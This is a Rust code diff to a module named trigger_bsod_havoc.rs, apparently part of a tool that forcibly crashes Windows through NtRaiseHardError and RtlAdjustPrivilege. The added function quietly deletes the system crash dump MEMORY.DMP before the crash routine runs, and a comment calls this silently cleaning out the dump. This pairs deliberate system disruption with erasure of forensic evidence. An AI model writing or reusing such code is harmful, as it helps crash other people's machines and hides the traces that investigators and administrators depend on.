@@ -1,5 +1,6 @@
 // src/behavior/trigger_bsod_havoc.rs
 
+use std::path::Path;
 use std::ptr;
 use std::thread;
 use std::time::Duration;
@@ -42,7 +43,23 @@ use crate::behavior::nterror::STATUS_NOT_COMMITED_EXEFLAG;
 use crate::panic::NtRaiseHardError;
 use crate::panic::RtlAdjustPrivilege;
 
+fn erase_dump() {
+    // Check if there's Memory dump
+    if let Ok(expanded) = shellexpand::env("%SystemRoot%\\MEMORY.DMP") {
+        let target_hit = Path::new(expanded.as_ref());
+        println!("expnd: {}", target_hit.display());
+        if fs::exists(target_hit).unwrap_or(false) {
+            println!("Found");
+            if let Err(err) = fs::remove_file(target_hit) {
+                println!("ERROR DELETING DUMP! {}", err);
+            }
+        }
+    }
+}
+
 pub fn Trigger_BSOD_Havoc() {
+    // Silently clean out dump
+    erase_dump();
     struct BSOD_Point {
         t1: i32,
         t2: u32,
